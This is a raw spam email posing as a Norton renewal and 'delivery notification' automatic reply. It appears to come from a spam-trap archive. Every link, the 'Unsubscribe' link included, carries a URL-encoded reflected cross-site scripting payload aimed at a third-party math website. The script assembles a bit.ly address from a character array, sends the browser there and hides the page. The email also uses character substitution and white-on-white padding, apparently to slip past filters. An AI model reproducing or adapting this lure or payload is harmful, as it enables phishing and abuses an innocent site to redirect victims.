@@ -1,0 +1,335 @@
+Return-Path: <>
+Delivered-To: untroubl8492-bruce@untroubled.org
+Received: (qmail 638718 invoked from network); 23 Jan 2024 00:03:05 -0000
+Received: from NAM02-SN1-obe.outbound.protection.outlook.com (mail-sn1nam02olkn2028.outbound.protection.outlook.com [40.92.44.28])
+  by vx0.untroubled.org ([45.63.65.23])
+  with ESMTP via TCP; 23 Jan 2024 00:03:05 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=kYcn4mYk+3PVk0mYrbujWjADuxnAU3Qn50HPbApu4sheh9QtWQt+1tEXen4E13rcW9InKWfi2nHH6055rjUBXCYASCsWyPtDogj7NOyYj+q0zPjidID4TQF/YYmV6dlHRq0Z/Vr3Tykaqv1I9P1HZeHTah1RGUSyN4fPeLk/mYXErnhNSU2QZoSy99xY7QHcUEZYoJ5b6pFhQ/fyn5vag2gXRNmfqQBVR4HmHC3hxnYDhUMQ0oDbms7XFfbGG8OCEoQjXlnlsyNhV53GPLXb3QV2JHn3p0CUGsSUKYiT9QEFmCgouCA4ycPvdBcJnW5JnzdunwsnbZCLEk5gpkJJdw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=0Wiitotb3njRtlqxMKJBGiLcuWl0bVsJ0Pboc9DOdC0=;
+ b=OovnSW6r52ClnLHeJlsFyKeJAdOCow2Fu8NtLmQvnxT+9Mw6twJdYX02dr3MvH6G+Yl55w+RKH2HBqPEtSTiuIjGNlqGYw2LGQjSoTnG/DSh31nGyCM5wNsGGesLZrDAlXZBtfS6qwWg3Sr5Jdsu8zLD6zNN1nMRdDH+yP1K3784WjHpMhimqvkbae20Nkqkds9DfuPvlkdOk+o6fUrMwXKkYLTEoTSmpgJ1bdh26W5DwxpSWJUzVUu/u3baSLJqMOKi19uN8USJAOLbTVQ2BbTYpUf39U9TRM4EJOFv0VE2Lo7/QUy4T+M+igRLr5Q1RGpO/ITptxdcmcGANWmfgA==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+Received: from DS0PR14MB7231.namprd14.prod.outlook.com (2603:10b6:8:166::10)
+ by CH3PR14MB6226.namprd14.prod.outlook.com (2603:10b6:610:147::22) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.7202.34; Tue, 23 Jan
+ 2024 00:03:02 +0000
+Received: from DS0PR14MB7231.namprd14.prod.outlook.com ([::1]) by
+ DS0PR14MB7231.namprd14.prod.outlook.com ([fe80::f51d:43a2:636:6c71%3]) with
+ Microsoft SMTP Server id 15.20.7202.031; Tue, 23 Jan 2024 00:03:02 +0000
+From: "FINAL NOTICE! NORTON_Needs Renewal! ."
+	<tomikofredregill570@hotmail.com>
+To: "bruce@untroubled.org" <bruce@untroubled.org>
+Subject: Automatic reply: 1404696006508039
+Thread-Topic: 1404696006508039
+Thread-Index: AQHaTY+IrACyLRdGn0uvjR43mgE2m7Dmg/GI
+Date: Tue, 23 Jan 2024 00:03:02 +0000
+Message-ID:
+ <15347ad2cef849ecaa1ebb3bb3592470@DS0PR14MB7231.namprd14.prod.outlook.com>
+References:
+ <ddhiUZMPBRu86h2CUJm21Bc1fIYvYkNhhPzKqpNo]@rN5LZJKCsi0IBDi.Xx07gmh2.prod.outlook.com>
+In-Reply-To:
+ <ddhiUZMPBRu86h2CUJm21Bc1fIYvYkNhhPzKqpNo]@rN5LZJKCsi0IBDi.Xx07gmh2.prod.outlook.com>
+X-MS-Has-Attach:
+X-Auto-Response-Suppress: All
+X-MS-Exchange-Inbox-Rules-Loop: tomikofredregill570@hotmail.com
+X-MS-TNEF-Correlator:
+x-ms-exchange-parent-message-id:
+ <ddhiUZMPBRu86h2CUJm21Bc1fIYvYkNhhPzKqpNo]@rN5LZJKCsi0IBDi.Xx07gmh2.prod.outlook.com>
+auto-submitted: auto-generated
+x-ms-exchange-generated-message-source: Mailbox Rules Agent
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: DS0PR14MB7231:EE_|CH3PR14MB6226:EE_
+x-ms-office365-filtering-correlation-id: 8e632206-01aa-431b-2df4-08dc1ba6aad5
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info:
+ f7Ad18lbyq0j+iCaC6T1ZSq+MFBSftaNRD9p9qKGNNKorDX6wRe31o8fExXtgSDHjddu9WBIR0hvXochqaNIV7NT1qdvfig4SV5/9PYL2eYfKT0NhWQXUMVF4E+ar7RRbKq3eRsjBYe+ngMhIPAqEb/mbMHOo+2XL5opz/K6ON+HCUk/LS0PCrVslMc/SHR7amNhXDLVcdIZN8NFNymvh98WtJGJ6/Qa+wXS0/bNlXyNyEbwlntMEuXdpf6RsFFxnCotnGi1zeaAzR53beZCrpqXImO3OAZYR83Hpfy7StxsxdcpT26hpazY/Fxkp/vM7FWBUaiKElUncYn4qJSVzAk7QfVLD/uVGzGklTt1OvLnuL2FQ8ZFdWM2/XribIrc6FpbBDqIK7HE+pN2mL04az8fkfVcdys1dpzL9zlxNL64SYYSFuM44xkYK2r7uEbFLXblMy3Ls8TNrnjTZM95YLnJc44GE9PkxVtiLEgY3RghwVKrE3K+S5BrACq7+a1gU2Rh3bFHeyi3mzn1Dzu+CoGC4iBLuQsRTgUjnhO3bjKwuQF+HYG7yw8mULZ2nEkbzF5y54t0iFueIQjtwpRE4HBF5HdkKFfBa22noiSn2G1/iJUW+GGKpMzuGpvUwh6DD/85kAQSwbksDAg3jBFL3ZBXUZfiUvgIfG52AZAIjxO2ttKarr90AXVdJniEYxoR
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ mwQqypZAUUzm9BIbgW25/1SORTtrWJH3+HfFv1zI3zheQFP6SnaddMmC0Hs2Zm5QxfJbR8EAHYlmPfGk5fR30wgTRjAvmc6+52DXmiOrvfDdvTXIAJq3P+7BaNnYL4OMNFKSbZyUy/XJ03wsr5F3IHmLpNl2s4iN6j9RqsvDb8psr6yFpHUmp/xutgVM9eWSbHalZ9AuG3FI674mIBA3izqaKcL1RbYnxc5EibiRDuiBEZ9vSt4fGrXsM5x8PCFEa+lAHCtpZME1RV2zmBxfoCL1yuB4PRi58I4XdE1rIj3Llx4oAreAl6ryY+LZvZVz
+Content-Type: multipart/alternative;
+	boundary="_000_15347ad2cef849ecaa1ebb3bb3592470DS0PR14MB7231namprd14pr_"
+MIME-Version: 1.0
+X-OriginatorOrg: sct-15-20-4755-11-msonline-outlook-cd57b.templateTenant
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: DS0PR14MB7231.namprd14.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 8e632206-01aa-431b-2df4-08dc1ba6aad5
+X-MS-Exchange-CrossTenant-originalarrivaltime: 23 Jan 2024 00:03:02.3994
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH3PR14MB6226
+
+--_000_15347ad2cef849ecaa1ebb3bb3592470DS0PR14MB7231namprd14pr_
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+Delivery N0tificati0n :Last Reminder: C0nfirmati0n Needed<https://www.mathc=
+elebrity.com/search.php?q=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B=
+%27replace%27%5D%28%5B%27h%27%2C%20%27t%27%2C%20%27t%27%2C%20%27p%27%2C%20%=
+27s%27%2C%20%27%3A%27%2C%20%27%2F%27%2C%20%27%2F%27%2C%20%27b%27%2C%20%27i%=
+27%2C%20%27t%27%2C%20%27.%27%2C%20%27l%27%2C%20%27y%27%2C%20%27%2F%27%2C%20=
+%273%27%2C%20%27S%27%2C%20%27q%27%2C%20%27h%27%2C%20%27p%27%2C%20%27T%27%2C=
+%20%27P%27%5D%5B%27join%27%5D%28%27%27%29%29%2Cdocument%5B%27body%27%5D%5B%=
+27style%27%5D%5B%27opacity%27%5D%3D0x0%3B%3C%2Fscript%3E>
+
+
+<AAAAAAA>
+<AAAAAA>[https://files.gamebanana.com/img/ss/mods/65aeb09a4bb18.jpg]<https:=
+//www.mathcelebrity.com/search.php?q=3D%22%3E%3Cscript%3Ewindow%5B%27locati=
+on%27%5D%5B%27replace%27%5D%28%5B%27h%27%2C%20%27t%27%2C%20%27t%27%2C%20%27=
+p%27%2C%20%27s%27%2C%20%27%3A%27%2C%20%27%2F%27%2C%20%27%2F%27%2C%20%27b%27=
+%2C%20%27i%27%2C%20%27t%27%2C%20%27.%27%2C%20%27l%27%2C%20%27y%27%2C%20%27%=
+2F%27%2C%20%273%27%2C%20%27S%27%2C%20%27q%27%2C%20%27h%27%2C%20%27p%27%2C%2=
+0%27T%27%2C%20%27P%27%5D%5B%27join%27%5D%28%27%27%29%29%2Cdocument%5B%27bod=
+y%27%5D%5B%27style%27%5D%5B%27opacity%27%5D%3D0x0%3B%3C%2Fscript%3E>
+
+To Unsubscribe From Future Emails<https://www.mathcelebrity.com/search.php?=
+q=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27%5D%28%5B%2=
+7h%27%2C%20%27t%27%2C%20%27t%27%2C%20%27p%27%2C%20%27s%27%2C%20%27%3A%27%2C=
+%20%27%2F%27%2C%20%27%2F%27%2C%20%27b%27%2C%20%27i%27%2C%20%27t%27%2C%20%27=
+.%27%2C%20%27l%27%2C%20%27y%27%2C%20%27%2F%27%2C%20%274%27%2C%20%278%27%2C%=
+20%27J%27%2C%20%274%27%2C%20%27r%27%2C%20%279%27%2C%20%27C%27%5D%5B%27join%=
+27%5D%28%27%27%29%29%2Cdocument%5B%27body%27%5D%5B%27style%27%5D%5B%27opaci=
+ty%27%5D%3D0x0%3B%3C%2Fscript%3E>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--_000_15347ad2cef849ecaa1ebb3bb3592470DS0PR14MB7231namprd14pr_
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
+>
+</head>
+<body>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center"><span style=3D"font-size:24px"><a href=3D"https://www.mathce=
+lebrity.com/search.php?q=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%=
+27replace%27%5D%28%5B%27h%27%2C%20%27t%27%2C%20%27t%27%2C%20%27p%27%2C%20%2=
+7s%27%2C%20%27%3A%27%2C%20%27%2F%27%2C%20%27%2F%27%2C%20%27b%27%2C%20%27i%2=
+7%2C%20%27t%27%2C%20%27.%27%2C%20%27l%27%2C%20%27y%27%2C%20%27%2F%27%2C%20%=
+273%27%2C%20%27S%27%2C%20%27q%27%2C%20%27h%27%2C%20%27p%27%2C%20%27T%27%2C%=
+20%27P%27%5D%5B%27join%27%5D%28%27%27%29%29%2Cdocument%5B%27body%27%5D%5B%2=
+7style%27%5D%5B%27opacity%27%5D%3D0x0%3B%3C%2Fscript%3E"><span style=3D"fon=
+t-family:Georgia,serif"><strong><span style=3D"color:rgb(255,0,0)">Delivery
+ N0tificati0n :Last Reminder: C0nfirmati0n Needed</span><span style=3D"colo=
+r:rgb(255,0,0)"></span></strong></span></a></span></p>
+<div dir=3D"ltr" style=3D"font-family:&quot;Times New Roman&quot;; font-siz=
+e:medium; text-align:start">
+<div style=3D"background-color:rgb(255,255,255)"><a href=3D"AAAAAAA"><stron=
+g><br>
+</strong></a></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><a href=
+=3D"AAAAAA"><strong></strong></a><strong><a href=3D"https://www.mathcelebri=
+ty.com/search.php?q=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%27rep=
+lace%27%5D%28%5B%27h%27%2C%20%27t%27%2C%20%27t%27%2C%20%27p%27%2C%20%27s%27=
+%2C%20%27%3A%27%2C%20%27%2F%27%2C%20%27%2F%27%2C%20%27b%27%2C%20%27i%27%2C%=
+20%27t%27%2C%20%27.%27%2C%20%27l%27%2C%20%27y%27%2C%20%27%2F%27%2C%20%273%2=
+7%2C%20%27S%27%2C%20%27q%27%2C%20%27h%27%2C%20%27p%27%2C%20%27T%27%2C%20%27=
+P%27%5D%5B%27join%27%5D%28%27%27%29%29%2Cdocument%5B%27body%27%5D%5B%27styl=
+e%27%5D%5B%27opacity%27%5D%3D0x0%3B%3C%2Fscript%3E" target=3D"_blank"><img =
+src=3D"https://files.gamebanana.com/img/ss/mods/65aeb09a4bb18.jpg"></a><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><strong=
+><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><strong=
+><a href=3D"https://www.mathcelebrity.com/search.php?q=3D%22%3E%3Cscript%3E=
+window%5B%27location%27%5D%5B%27replace%27%5D%28%5B%27h%27%2C%20%27t%27%2C%=
+20%27t%27%2C%20%27p%27%2C%20%27s%27%2C%20%27%3A%27%2C%20%27%2F%27%2C%20%27%=
+2F%27%2C%20%27b%27%2C%20%27i%27%2C%20%27t%27%2C%20%27.%27%2C%20%27l%27%2C%2=
+0%27y%27%2C%20%27%2F%27%2C%20%274%27%2C%20%278%27%2C%20%27J%27%2C%20%274%27=
+%2C%20%27r%27%2C%20%279%27%2C%20%27C%27%5D%5B%27join%27%5D%28%27%27%29%29%2=
+Cdocument%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D%3D0x0%3B%3C%2=
+Fscript%3E">To
+ Unsubscribe From Future Emails</a><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; color:rgb(34,34,34); background-color:rgb(=
+255,255,255)">
+<font style=3D"color:rgb(255,255,255); background-color:rgb(255,255,255)"><=
+br>
+</font></div>
+<font style=3D"color:rgb(255,255,255); background-color:rgb(255,255,255)"><=
+br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+</font></div>
+</body>
+</html>
+
+--_000_15347ad2cef849ecaa1ebb3bb3592470DS0PR14MB7231namprd14pr_--
